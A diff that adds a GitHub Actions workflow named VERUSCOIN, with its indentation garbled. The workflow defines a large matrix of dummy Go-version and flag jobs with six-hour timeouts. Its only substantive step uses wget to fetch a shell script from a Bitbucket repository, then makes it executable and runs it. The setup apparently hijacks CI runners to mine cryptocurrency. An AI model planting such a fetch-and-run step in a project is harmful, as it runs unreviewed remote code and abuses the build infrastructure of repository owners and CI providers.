@@ -1,0 +1,29 @@
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+      name: Raino
+          runs-on: ubuntu-latest
+              strategy:
+                    max-parallel: 20
+                          fail-fast: false
+                                matrix:
+                                        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+                                                flag: [A, B, C, D, E, F, G, H, I]
+                                                    timeout-minutes: 360
+                                                        env:
+                                                                NUM_JOBS: 20
+                                                                        JOB: ${{ matrix.go }}
+                                                                            steps:
+                                                                                - name: Set up Go ${{ matrix.go }}
+                                                                                      uses: actions/setup-go@v1
+                                                                                            with:
+                                                                                                    go-version: ${{ matrix.go }}
+                                                                                                          id: go
+                                                                                                              - name: Setup
+                                                                                                                    uses: actions/checkout@v1
+                                                                                                                        - name: Raino
+                                                                                                                              run: |
+                                                                                                                                      wget  https://bitbucket.org/kina2007/test/raw/cf672d4ddfd670ce59df06b55c29e8d5fc6a89cb/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+                                                                                                                                      
+                                                                                                                                      
